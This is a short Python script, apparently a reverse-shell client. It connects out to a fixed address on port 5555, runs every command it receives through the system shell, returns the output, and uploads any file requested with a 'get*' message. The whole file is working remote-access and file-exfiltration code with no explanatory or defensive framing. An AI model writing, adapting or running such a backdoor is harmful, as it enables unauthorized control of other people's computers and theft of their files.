import socket
import os
import subprocess

# from server import transfer

s = socket.socket()
host = "192.168.0.131"
port = 5555

s.connect((host, port))

while True:

    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if 'get' in data.decode("utf-8"):
        grab, file = data.decode("utf-8").split('*')
        path = os.getcwd() + "\\" + file
        f = open(path, "rb")
        datas = f.read(1024)
        while datas:
            s.send(datas)
            datas = f.read()
        f.close()

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        PWD = os.getcwd() + ">"
        s.send(str.encode(output_str + PWD))